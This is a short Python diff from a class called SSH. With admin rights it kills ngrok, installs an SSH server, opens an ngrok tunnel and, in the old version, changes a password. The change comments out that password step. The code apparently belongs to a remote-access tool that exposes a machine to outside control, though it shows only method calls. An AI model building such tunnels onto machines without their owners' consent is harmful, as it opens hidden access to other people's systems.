@@ -20,7 +20,7 @@ class SSH():
 			os.system('taskkill /IM ngrok.exe /F')
 			self.Install_SSH()
 			self.Ngrok()
-			self.Change_Password()
+			#self.Change_Password()
 		else:
 			self.SendMessage("✖️ Need Admin Permissions.")
 
